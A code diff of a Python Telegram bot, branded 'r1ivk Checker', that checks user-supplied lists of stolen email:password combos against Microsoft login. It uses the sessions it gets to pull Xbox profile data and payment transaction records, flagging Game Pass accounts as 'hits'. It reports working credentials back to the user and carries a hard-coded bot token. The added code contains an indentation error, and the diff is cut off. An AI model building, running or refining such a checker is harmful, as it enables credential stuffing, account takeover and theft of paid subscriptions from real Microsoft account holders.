@@ -1,456 +1,381 @@
-# -*- coding: utf-8 -*-
-"""
-r1livk Elite Advanced Xbox & Microsoft Core Engine ⚡ - Telegram Bot (Original Fixed)
-"""
-
-import os
-import re
-import time
-import json
-import asyncio
-from datetime import date
-from urllib.parse import urlparse, parse_qs
-from curl_cffi.requests import AsyncSession
 import telebot
 from telebot import types
+import requests
+import re
+import json
+from urllib.parse import unquote, quote
+import threading
+import queue
+import time
+from datetime import datetime
 
-TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
-OWNER_ID = 6266959915
-OWNER_USERNAME = "r1ivk"
-CHANNEL_USERNAME = "@r1iv_k"  
-bot = telebot.TeleBot(TOKEN)
+# Telegram Bot Token
+TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
+bot = telebot.TeleBot(TELEGRAM_TOKEN)
 
-PREMIUM_USERS_FILE = "premium_users.txt"
-STATS_FILE = "user_stats.json"
+# User Sessions Storage
+user_sessions = {}
 
-user_states = {}
-active_scans = {}
-user_usage = {}
-DAILY_LIMIT = 5000
-
-def load_json_data(filepath, default_val):
-    if not os.path.exists(filepath):
-        return default_val
+def solider(source_text, left_str, right_str, var_name, variables, create_empty=True, prefix="", suffix=""):
     try:
-        with open(filepath, "r", encoding="utf-8") as f:
-            return json.load(f)
-    except:
-        return default_val
-
-def save_json_data(filepath, data):
-    try:
-        with open(filepath, "w", encoding="utf-8") as f:
-            json.dump(data, f, ensure_ascii=False, indent=4)
-    except:
-        pass
-
-def load_premium_users():
-    if not os.path.exists(PREMIUM_USERS_FILE):
-        return set()
-    with open(PREMIUM_USERS_FILE, "r") as f:
-        return set(line.strip() for line in f if line.strip())
-
-def is_owner_or_bypass(user_id, username=None):
-    try:
-        if int(user_id) == OWNER_ID:
+        match = re.search(f"{re.escape(left_str)}(.*?){re.escape(right_str)}", source_text, re.DOTALL)
+        if match:
+            value = match.group(1)
+            variables[var_name] = f"{prefix}{value}{suffix}"
             return True
-    except:
-        pass
-    if username and username.lower() == OWNER_USERNAME.lower():
-        return True
-    prem_set = load_premium_users()
-    if str(user_id) in prem_set:
-        return True
-    return False
+        else:
+            if create_empty:
+                variables[var_name] = ""
+            return False
+    except Exception:
+        if create_empty:
+            variables[var_name] = ""
+        return False
 
-def check_user_subscription(user_id, username=None):
-    if is_owner_or_bypass(user_id, username):
-        return True
+def soliderRetries(session, method, url, step_name, retries_counter_list, **kwargs):
+    soliderMaxPer = 100
+    soliderTimeOut = 15
+    for attempt in range(soliderMaxPer + 1):
+        try:
+            response = session.request(method, url, timeout=soliderTimeOut, **kwargs)
+            return response
+        except (requests.exceptions.ProxyError, requests.exceptions.SSLError):
+            if retries_counter_list:
+                retries_counter_list[0] += 1
+            raise
+        except requests.exceptions.RequestException:
+            if attempt < soliderMaxPer:
+                if retries_counter_list:
+                    retries_counter_list[0] += 1
+                time.sleep(1 + attempt)
+                continue
+            else:
+                raise
+    return None
+
+def soliderChkAccount(user_pass_line, proxy_dict_for_session, check_mode):
     try:
-        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
-        if member.status in ['member', 'administrator', 'creator']:
-            return True
+        user, password = user_pass_line.split(':', 1)
+    except ValueError:
+        return "BAD_CREDENTIALS", None, 0
+      
+    variables = {'USER': user, 'PASS': password}
+    current_status_internal = "UNKNOWN_INIT"
+    account_retry_attempts = [0] 
+
+    session = requests.Session()
+    if proxy_dict_for_session:
+        session.proxies = proxy_dict_for_session
+        
+    soliderPPFT = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
+    soliderBK = "1665024852"
+    soliderUAID = "a5b22c26bc704002ac309462e8d061bb"
+
+    try:
+        url_login = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={quote(variables['USER'])}&contextid=2CCDB02DC526CA71&bk={soliderBK}&uaid={soliderUAID}&pid=15216"
+        
+        payload_login_template = "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>"
+        payload_login = payload_login_template.replace("<USER>", variables['USER']) \
+                                    .replace("<PASS>", variables['PASS']) \
+                                    .replace("{ppft}", soliderPPFT)
+
+        headers_login = {
+            "Host": "login.live.com",
+            "Cache-Control": "max-age=0",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Origin": "https://login.live.com",
+            "Referer": f"https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid={soliderUAID}&display=touch&username={quote(variables['USER'])}",
+        }
+        
+        response_login = soliderRetries(session, 'POST', url_login, "Login", account_retry_attempts, headers=headers_login, data=payload_login, allow_redirects=True)
+        if not response_login: return "NETWORK_ERROR_LOGIN", None, account_retry_attempts[0]
+        response_text = response_login.text
+        response_url = response_login.url
+
+        if "Your account or password is incorrect." in response_text or \
+           "That Microsoft account doesn\\'t exist" in response_text or \
+           ("Sign in to your Microsoft account" in response_text and "oauth20_desktop.srf#access_token=" not in response_url):
+            current_status_internal = "FAILURE_CREDENTIALS"
+        elif ",AC:null,urlFedConvertRename" in response_text:
+            current_status_internal = "BAN_LOCKED"
+        elif "account.live.com/recover" in response_text or "account.live.com/identity/confirm" in response_text:
+            current_status_internal = "2FACTOR_VERIFICATION"
+        else:
+            success_cookie_found = any(cookie.name in ["ANON", "WLSSC"] for cookie in session.cookies)
+            successful_redirect = "oauth20_desktop.srf#access_token=" in response_url or "https://login.live.com/oauth20_desktop.srf?" in response_url
+            if successful_redirect or success_cookie_found:
+                current_status_internal = "SUCCESS_LOGIN_STEP"
+            else:
+                current_status_internal = "FAILURE_LOGIN_UNKNOWN"
+
+    except Exception:
+        return "NETWORK_ERROR_LOGIN", None, account_retry_attempts[0]
+    
+    if current_status_internal != "SUCCESS_LOGIN_STEP":
+        if current_status_internal == "FAILURE_CREDENTIALS": return "BAD_CREDENTIALS", None, account_retry_attempts[0]
+        if current_status_internal == "2FACTOR_VERIFICATION": return "2FA_REQUIRED", None, account_retry_attempts[0]
+        return "LOGIN_FAILED_OTHER", None, account_retry_attempts[0]
+    
+    try:
+        url_oauth_auth = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&prompt=none"
+        response_oauth_auth = soliderRetries(session, 'GET', url_oauth_auth, "OAuth", account_retry_attempts, allow_redirects=True)
+        if not response_oauth_auth or "access_token=" not in response_oauth_auth.url:
+            return "TOKEN_ERROR_OAUTH_PARSE", None, account_retry_attempts[0]
+            
+        solider(response_oauth_auth.url, "access_token=", "&token_type", "Token", variables)
+        if not variables.get("Token"):
+            return "TOKEN_ERROR_OAUTH_MISSING", None, account_retry_attempts[0]
+    except Exception:
+        return "NETWORK_ERROR_OAUTH", None, account_retry_attempts[0]
+    
+    has_game_pass = False
+    game_pass_type = "false"
+    game_pass_expired = "false"
+    game_pass_expiry_date = "N/A"
+    
+    try:
+        url_payment_transactions = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
+        headers_payment = {
+            "Authorization": f"MSADELEGATE1.0=\"{variables['Token']}\"",
+            "Accept": "application/json"
+        }
+        response_payment = soliderRetries(session, 'GET', url_payment_transactions, "PaymentTransactions", account_retry_attempts, headers=headers_payment)
+        if response_payment and response_payment.status_code == 200:
+            transactions_data_text = response_payment.text
+            solider(transactions_data_text, 'title":"', '",', "Item 1", variables) 
+            solider(transactions_data_text, '"nextRenewalDate":"', 'T', "nextRenewalDate", variables)
+            
+            item1 = variables.get("Item 1", "").lower()
+            if "xbox game pass" in item1 or "game pass" in item1:
+                has_game_pass = True
+                if "pc" in item1: game_pass_type = "pcgamepass"
+                elif "ultimate" in item1: game_pass_type = "ultimate"
+                elif "console" in item1: game_pass_type = "console"
+                else: game_pass_type = "true"
+                
+                expiry_date_str = variables.get("nextRenewalDate", "")
+                if expiry_date_str:
+                    try:
+                        expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d")
+                        game_pass_expiry_date = expiry_date.strftime("%d-%m-%Y")
+                        if expiry_date < datetime.now():
+                            game_pass_expired = "true"
+                    except ValueError:
+                        game_pass_expiry_date = expiry_date_str
     except Exception:
         pass
-    return False
 
-def update_user_stats(user_id, checked_count, hits_count, username=None):
-    stats = load_json_data(STATS_FILE, {})
-    uid_str = str(user_id)
-    if uid_str not in stats:
-        stats[uid_str] = {"checked": 0, "hits": 0, "username": username or f"User_{user_id}"}
-    stats[uid_str]["checked"] += checked_count
-    stats[uid_str]["hits"] += hits_count
-    if username:
-        stats[uid_str]["username"] = username
-    save_json_data(STATS_FILE, stats)
+    if check_mode == 1:
+        if has_game_pass:
+            hit_string = f"{user_pass_line} | GamePass: {game_pass_type} | Expiry: {game_pass_expiry_date}"
+            return "GAME_PASS_HIT", hit_string, account_retry_attempts[0]
+        else:
+            return "NO_GAMEPASS", None, account_retry_attempts[0]
+    else:
+        if has_game_pass:
+            hit_string = f"{user_pass_line} | GamePass: {game_pass_type} | Expiry: {game_pass_expiry_date}"
+            return "FULL_CAPTURE_HIT", hit_string, account_retry_attempts[0]
+        else:
+            return "NO_HITS", None, account_retry_attempts[0]
 
-def check_daily_limit(chat_id, new_lines_count, username=None):
-    if is_owner_or_bypass(chat_id, username):
-        return True, new_lines_count
-        
-    today = str(date.today())
-    if chat_id not in user_usage or user_usage[chat_id]["date"] != today:
-        user_usage[chat_id] = {"date": today, "count": 0}
-    current_used = user_usage[chat_id]["count"]
-    if current_used >= DAILY_LIMIT:
-        return False, 0
-    allowed_lines = min(new_lines_count, DAILY_LIMIT - current_used)
-    return True, allowed_lines
-
-def update_usage(chat_id, count, username=None):
-    if is_owner_or_bypass(chat_id, username):
-        return
-    today = str(date.today())
-    if chat_id in user_usage and user_usage[chat_id]["date"] == today:
-        user_usage[chat_id]["count"] += count
-
-def extract_ppft(text):
-    patterns = [
-        r'sFTTag:\s*["\']([^"\']+)["\']',
-        r'name="PPFT"[^>]*value="([^"]+)"',
-        r'value="([^"]+)"[^>]*name="PPFT"',
-        r'"PPFT":"([^"]+)"',
-        r'value=\\"([^\\"]+)\\"'
-    ]
-    for pattern in patterns:
-        match = re.search(pattern, text, re.IGNORECASE)
-        if match:
-            token = match.group(1)
-            return token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
-    return None
-
-def extract_url_post(text):
-    patterns = [
-        r'urlPost:\s*["\']([^"\']+)["\']',
-        r'"urlPost":"([^"]+)"',
-        r"urlPost:'([^']+)'",
-        r'id="fmHF"\s+action="([^"]+)"',
-        r'action="([^"]+)"[^>]*id="fmHF"'
-    ]
-    for pattern in patterns:
-        match = re.search(pattern, text, re.IGNORECASE)
-        if match:
-            return match.group(1).replace('\\/', '/')
-    return None
-
-async def elite_check_account(combo):
-    parts = combo.split(':')
-    if len(parts) < 2:
-        return "bad", "Invalid Format"
-
-    email = parts[0].strip()
-    password = ':'.join(parts[1:]).strip()
-    
-    try:
-        async with AsyncSession(impersonate="chrome120") as session:
-            auth_url = (
-                "https://login.live.com/oauth20_authorize.srf"
-                "?client_id=00000000402B5328"
-                "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
-                "&scope=service::user.auth.xboxlive.com::MBI_SSL"
-                "&display=touch"
-                "&response_type=token"
-                "&locale=en"
-            )
-            
-            resp = await session.get(auth_url, timeout=12)
-            sftag = extract_ppft(resp.text)
-            url_post = extract_url_post(resp.text)
-
-            if not sftag or not url_post:
-                return "error", "Init Error"
-
-            payload = {
-                'login': email,
-                'loginfmt': email,
-                'passwd': password,
-                'PPFT': sftag,
-                'type': '11',
-                'NewUser': '1',
-                'LoginOptions': '3',
-            }
-            headers = {
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Referer': auth_url,
-                'Origin': 'https://login.live.com',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-            }
-            
-            login_res = await session.post(url_post, data=payload, headers=headers, allow_redirects=True, timeout=12)
-            txt = login_res.text.lower()
-            url = login_res.url.lower()
-
-            tfa_triggers = ["two-step", "additional security", "identity/confirm?m=", "proofs", "challenge/contact", "sendcode", "device-auth"]
-            if any(t in txt or t in url for t in tfa_triggers):
-                if "password is incorrect" not in txt and "incorrect password" not in txt:
-                    return "2fa", None
-
-            if any(x in txt for x in ["doesn't exist", "enter a valid email", "account doesn't exist"]):
-                return "bad", "Not Exist"
-
-            if any(x in txt for x in ["password is incorrect", "incorrect password", "enter the password"]):
-                return "bad", "Wrong Password"
-
-            if "locked" in txt or "suspended" in txt:
-                return "bad", "Locked"
-
-            ms_token = None
-            def search_token_in_string(s):
-                if 'access_token=' in s:
-                    try:
-                        parsed = urlparse(s)
-                        frag = parse_qs(parsed.fragment)
-                        if 'access_token' in frag:
-                            return frag['access_token'][0]
-                        query = parse_qs(parsed.query)
-                        if 'access_token' in query:
-                            return query['access_token'][0]
-                    except:
-                        pass
-                m = re.search(r'access_token=([^&\s\"\']+)', s)
-                if m:
-                    return m.group(1)
-                return None
-
-            ms_token = search_token_in_string(login_res.url)
-            if not ms_token:
-                for hist in login_res.history:
-                    ms_token = search_token_in_string(hist.url)
-                    if ms_token:
-                        break
-            if not ms_token:
-                ms_token = search_token_in_string(login_res.text)
-
-            if not ms_token:
-                return "bad", "No Token"
-
-            xb_payload = {
-                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, 
-                "RelyingParty": "http://auth.xboxlive.com", 
-                "TokenType": "JWT"
-            }
-            xb_res = await session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, timeout=12)
-            if xb_res.status_code != 200:
-                return "bad", "XBox Auth Denied"
-
-            xb_json = xb_res.json()
-            xb_token = xb_json.get('Token')
-            xui = xb_json.get('DisplayClaims', {}).get('xui', [])
-            if not xb_token or not xui:
-                return "bad", "XBox Token Invalid"
-                
-            uhs = xui[0].get('uhs')
-
-            xsts_payload = {
-                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, 
-                "RelyingParty": "http://xboxlive.com", 
-                "TokenType": "JWT"
-            }
-            xsts_res = await session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_payload, timeout=12)
-            if xsts_res.status_code != 200:
-                return "bad", "XSTS Failed"
-
-            xsts_token = xsts_res.json().get('Token')
-            if not xsts_token:
-                return "bad", "XSTS Token Missing"
-            
-            prof_res = await session.get(
-                "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore,AccountTier,TenureLevel", 
-                headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2"}, 
-                timeout=12
-            )
-
-            gamertag = "N/A"
-            gamerscore = 0
-            tier = "Silver"
-            
-            if prof_res.status_code == 200:
-                settings = prof_res.json().get('profileUsers', [{}])[0].get('settings', [])
-                for s in settings:
-                    if s['id'] == 'Gamertag': gamertag = s['value']
-                    if s['id'] == 'Gamerscore': gamerscore = int(s['value']) if str(s['value']).isdigit() else 0
-                    if s['id'] == 'AccountTier': tier = s['value']
-
-            if gamerscore <= 0:
-                return "bad", "0G Filtered"
-
-            hit_data = (
-                f"⚡ [ELITE XBOX HIT] ⚡\n"
-                f"Combo: {email}:{password}\n"
-                f"Gamertag: {gamertag}\n"
-                f"Gamerscore: {gamerscore}G 🏆\n"
-                f"Account Tier: {tier}\n"
-                f"=================================================="
-            )
-            return "hit", {"content": hit_data}
-
-    except Exception as e:
-        return "bad", f"Error: {str(e)}"
-
+# --- Telegram Bot Interface (r1ivk Checker UI) ---
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    chat_id = message.chat.id
-    user_id = message.from_user.id
-    username = message.from_user.username
-    if not check_user_subscription(user_id, username):
-        markup = types.InlineKeyboardMarkup(row_width=1)
-        btn_channel = types.InlineKeyboardButton("📢 Join Channel Now", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")
-        btn_check = types.InlineKeyboardButton("🔄 Verify Subscription", callback_data="check_sub")
-        markup.add(btn_channel, btn_check)
-        bot.send_message(chat_id, "⚠️ **Access Denied! Subscribe to channel first.**", parse_mode="Markdown", reply_markup=markup)
-        return
-    show_main_menu(message)
-
-def show_main_menu(message):
-    chat_id = message.chat.id if hasattr(message, 'chat') else message.chat.id
-    user_id = message.from_user.id if hasattr(message, 'from_user') and message.from_user else chat_id
-    username = message.from_user.username if hasattr(message, 'from_user') and message.from_user else None
-    msg_id = message.message.message_id if hasattr(message, 'message') and hasattr(message.message, 'message_id') else None
-
-    markup = types.InlineKeyboardMarkup(row_width=1)
+    markup = types.InlineKeyboardMarkup(row_width=2)
     markup.add(
-        types.InlineKeyboardButton("🚀 Start Elite Xbox Pipeline", callback_data="start_checker"),
-        types.InlineKeyboardButton("🏆 Leaderboard", callback_data="show_leaderboard"),
-        types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
+        types.InlineKeyboardButton("🚀 START", callback_data="start_scan"),
+        types.InlineKeyboardButton("❌ CLOSE", callback_data="close_bot"),
+        types.InlineKeyboardButton("🔑 SERVICES", callback_data="services"),
+        types.InlineKeyboardButton("🔥 CRACKER", callback_data="cracker"),
+        types.InlineKeyboardButton("🎁 REFER", callback_data="refer"),
+        types.InlineKeyboardButton("🏆 LEADERBOARD", callback_data="leaderboard"),
+        types.InlineKeyboardButton("💎 BUY", callback_data="buy"),
+        types.InlineKeyboardButton("👤 PROFILE", callback_data="profile")
+    )
+    welcome_text = (
+        "💎 **r1ivk Checker Bot** 💎\n\n"
+        "Welcome back! Choose an option from the menu below:"
+    )
+    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data in ["start_scan", "services", "cracker", "refer", "leaderboard", "buy", "profile", "close_bot"])
+def handle_menu(call):
+    bot.answer_callback_query(call.id)
+    chat_id = call.message.chat.id
+    
+    if call.data == "close_bot":
+        bot.delete_message(chat_id, call.message.message_id)
+        return
+        
+    if call.data == "start_scan":
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            types.InlineKeyboardButton("⚡ Game Pass Only", callback_data="mode_1"),
+            types.InlineKeyboardButton("🔍 Full Capture", callback_data="mode_2"),
+            types.InlineKeyboardButton("🔙 Back", callback_data="main_menu")
+        )
+        bot.edit_message_text("📂 **Select Checking Mode:**", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+    elif call.data == "main_menu":
+        send_welcome_edit(call)
+    else:
+        bot.answer_callback_query(call.id, "Section under development!", show_alert=True)
+
+def send_welcome_edit(call):
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("🚀 START", callback_data="start_scan"),
+        types.InlineKeyboardButton("❌ CLOSE", callback_data="close_bot"),
+        types.InlineKeyboardButton("🔑 SERVICES", callback_data="services"),
+        types.InlineKeyboardButton("🔥 CRACKER", callback_data="cracker"),
+        types.InlineKeyboardButton("🎁 REFER", callback_data="refer"),
+        types.InlineKeyboardButton("🏆 LEADERBOARD", callback_data="leaderboard"),
+        types.InlineKeyboardButton("💎 BUY", callback_data="buy"),
+        types.InlineKeyboardButton("👤 PROFILE", callback_data="profile")
+    )
+    bot.edit_message_text("💎 **r1ivk Checker Bot** 💎\n\nWelcome back! Choose an option from the menu below:", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data in ["mode_1", "mode_2"])
+def set_mode(call):
+    bot.answer_callback_query(call.id)
+    mode = 1 if call.data == "mode_1" else 2
+    user_sessions[call.from_user.id] = {"mode": mode, "step": "waiting_combos"}
+    
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="start_scan"))
+    
+    bot.edit_message_text(
+        "📥 **Please send your combos list (user:pass format, one per line):**",
+        chat_id=call.message.chat.id,
+        message_id=call.message.message_id,
+        parse_mode="Markdown",
+        reply_markup=markup
     )
 
-    if is_owner_or_bypass(user_id, username):
-        status_text = "👑 Owner / Unlimited"
-    else:
-        status_text = "👤 Free User"
-
-    text = f"⚡ **r1livk Elite Xbox Core Engine** ⚡\n\nStatus: {status_text}\nSelect an option:"
-    if msg_id:
-        try:
-            bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=markup)
-            return
-        except:
-            pass
-    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)
-
-@bot.callback_query_handler(func=lambda call: True)
-def callback_query(call):
-    chat_id = call.message.chat.id
-    user_id = call.from_user.id
-    username = call.from_user.username
-
-    if call.data == "check_sub":
-        if check_user_subscription(user_id, username):
-            bot.answer_callback_query(call.id, "✅ Verified!", show_alert=True)
-            show_main_menu(call.message)
-        else:
-            bot.answer_callback_query(call.id, "❌ Not joined yet!", show_alert=True)
-        return
-
-    if call.data == "start_checker":
-        user_states[chat_id] = "combo"
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="back_to_menu"))
-        bot.edit_message_text("🎯 **Send your combo file (.txt)**", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
-
-    elif call.data == "back_to_menu":
-        active_scans[chat_id] = False
-        show_main_menu(call.message)
-
-    elif call.data == "stop_scan":
-        active_scans[chat_id] = False
-        bot.answer_callback_query(call.id, "⏹️ Scan stopped.")
-
-    elif call.data == "my_account":
-        status = "👑 Owner / Unlimited" if is_owner_or_bypass(user_id, username) else "👤 Free"
-        bot.answer_callback_query(call.id, f"Status: {status}", show_alert=True)
-
-@bot.message_handler(content_types=['document'])
-def handle_docs(message):
-    chat_id = message.chat.id
+@bot.message_handler(func=lambda message: message.from_user.id in user_sessions and user_sessions[message.from_user.id]["step"] == "waiting_combos")
+def handle_combos(message):
     user_id = message.from_user.id
-    username = message.from_user.username
+    combos = [line.strip() for line in message.text.split("\n") if ':' in line.strip()]
     
-    if not check_user_subscription(user_id, username):
-        bot.reply_to(message, "⚠️ Join channel first!")
+    if not combos:
+        bot.send_message(message.chat.id, "❌ No valid combos found. Please send in `user:pass` format:")
         return
-
-    try:
-        file_info = bot.get_file(message.document.file_id)
-        downloaded_file = bot.download_file(file_info.file_path)
-
-        local_path = f"temp_elite_{chat_id}.txt"
-        with open(local_path, 'wb') as f:
-            f.write(downloaded_file)
-
-        with open(local_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
-            lines = [line.strip() for line in f if line.strip() and ':' in line]
-
-        allowed, count_allowed = check_daily_limit(user_id, len(lines), username)
-        if not allowed or count_allowed <= 0:
-            bot.reply_to(message, "⚠️ Daily limit reached.")
-            if os.path.exists(local_path): os.remove(local_path)
-            return
-
-        lines = lines[:count_allowed]
-        bot.reply_to(message, f"📥 File accepted. Initializing for {len(lines)} lines...")
-        active_scans[chat_id] = True
         
-        import threading
-        threading.Thread(target=lambda: asyncio.run(process_elite_scan(chat_id, local_path, lines, username, user_id))).start()
-
-    except Exception as e:
-        bot.reply_to(message, f"Error: {e}")
-
-async def process_elite_scan(chat_id, filepath, lines, username, user_id):
-    total = len(lines)
-    checked = 0
-    hits = 0
-    tfa_count = 0
-    bad = 0
-
-    timestamp_str = time.strftime("%Y%m%d_%H%M%S")
-    output_filename = f"r1livk_EliteHits_{timestamp_str}.txt"
-    start_time = time.time()
-
+    mode = user_sessions[user_id]["mode"]
+    user_sessions[user_id]["stop"] = False
+    
+    # Send initial progress dashboard message
     markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan"))
+    markup.add(types.InlineKeyboardButton("🔴 Stop Scan", callback_data=f"stop_scan_{user_id}"))
+    
+    initial_text = generate_progress_text(0, len(combos), 0, 0, 0, 0, 0, 0, "00:00:00", "00:00", 0, "Running...")
+    prog_msg = bot.send_message(message.chat.id, initial_text, parse_mode="Markdown", reply_markup=markup)
+    
+    # Run checker in background thread
+    threading.Thread(target=run_live_checker, args=(message.chat.id, prog_msg.message_id, combos, mode, user_id)).start()
 
-    status_msg = bot.send_message(chat_id, "🔥 **Scan Initialized...**", parse_mode="Markdown", reply_markup=markup)
-    sem = asyncio.Semaphore(4)
+@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_scan_"))
+def stop_scan(call):
+    uid = int(call.data.split("_")[2])
+    if uid in user_sessions:
+        user_sessions[uid]["stop"] = True
+    bot.answer_callback_query(call.id, "Scan stopped by user!")
 
-    async def worker(combo):
-        nonlocal checked, hits, tfa_count, bad
-        if not active_scans.get(chat_id, True):
-            return
-        async with sem:
-            status, res_data = await elite_check_account(combo)
-            checked += 1
-            if status == "hit" and isinstance(res_data, dict):
-                hits += 1
-                with open(output_filename, 'a', encoding='utf-8') as out_f:
-                    out_f.write(res_data["content"] + "\n\n")
-            elif status == "2fa":
-                tfa_count += 1
-            elif status == "bad":
-                bad += 1
+def generate_progress_text(checked, total, gamepass, full_captures, two_fa, bad, cpm, elapsed_str, eta_str, progress_percent, status_title):
+    # Create progress bar like [████████░░] 80.0%
+    filled_blocks = int(progress_percent // 10)
+    bar = "█" * filled_blocks + "░" * (10 - filled_blocks)
+    
+    text = (
+        f"🤖 **r1ivk | AIOH Checker**\n"
+        f"bot\n\n"
+        f"Progress: {progress_percent:.1f}%\n"
+        f"`[{bar}]`\n\n"
+        f"⚡ CPM: {cpm}\n"
+        f"⏳ Elapsed: {elapsed_str}\n"
+        f"⏳ ETA: {eta_str}\n\n"
+        f"🎮 **Gaming Hits:**\n"
+        f"▪️ Game Pass Hits: {gamepass}\n"
+        f"▪️ Full Captures: {full_captures}\n"
+        f"▪️ 2FA: {two_fa}\n"
+        f"❌ Bad: {bad}\n"
+        f"📊 Checked: {checked} / {total}\n\n"
+        f"Status: **{status_title}**"
+    )
+    return text
 
-    tasks = [worker(line) for line in lines]
-    await asyncio.gather(*tasks, return_exceptions=True)
-    active_scans[chat_id] = False
+def run_live_checker(chat_id, message_id, combos, check_mode, user_id):
+    total = len(combos)
+    checked = 0
+    gamepass = 0
+    full_captures = 0
+    two_fa = 0
+    bad = 0
+    
+    start_time = time.time()
+    last_update_time = start_time
+    
+    for index, combo in enumerate(combos):
+        if user_sessions.get(user_id, {}).get("stop", False):
+            break
+            
+        status, hit_data, _ = soliderChkAccount(combo, None, check_mode)
+        checked += 1
+        
+        if status == "GAME_PASS_HIT":
+            gamepass += 1
+            bot.send_message(chat_id, f"🎯 **GamePass Hit!**\n`{hit_data}`", parse_mode="Markdown")
+        elif status == "FULL_CAPTURE_HIT":
+            full_captures += 1
+            bot.send_message(chat_id, f"🎯 **Full Capture Hit!**\n`{hit_data}`", parse_mode="Markdown")
+        elif status == "BAD_CREDENTIALS":
+            bad += 1
+        elif status == "2FA_REQUIRED":
+            two_fa += 1
+            
+        # Update metrics every 1 second or every 5 items to avoid Telegram Flood limits
+        current_time = time.time()
+        if current_time - last_update_time >= 1.5 or checked == total:
+            last_update_time = current_time
+            elapsed = int(current_time - start_time)
+            elapsed_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
+            
+            cpm = int((checked / (elapsed / 60))) if elapsed > 0 else 0
+            remaining_items = total - checked
+            eta_secs = int((remaining_items / (cpm / 60))) if cpm > 0 else 0
+            eta_str = time.strftime("%M:%S", time.gmtime(eta_secs))
+            progress_percent = (checked / total) * 100
+            
+            progress_text = generate_progress_text(
+                checked, total, gamepass, full_captures, two_fa, bad, 
+                cpm, elapsed_str, eta_str, progress_percent, "Scanning..."
+            )
+            
+            try:
+                bot.edit_message_text(progress_text, chat_id=chat_id, message_id=message_id, parse_mode="Markdown")
+        except Exception:
+            pass
 
-    if os.path.exists(filepath):
-        os.remove(filepath)
-
-    update_user_stats(user_id, checked, hits, username)
-    update_usage(user_id, checked, username)
-
-    final_msg = f"🎉 **SCAN COMPLETED!**\nChecked: {checked}\nHits: {hits}"
+    # Final Summary Screen matching screenshot layout
+    final_elapsed = int(time.time() - start_time)
+    final_elapsed_str = time.strftime("%H:%M:%S", time.gmtime(final_elapsed))
+    final_cpm = int((total / (final_elapsed / 60))) if final_elapsed > 0 else 0
+    
+    completion_text = (
+        f"✅ **XBOX FULL CAPTURE COMPLETED!**\n\n"
+        f"🌐 Total: {total} / {final_cpm} CPM\n"
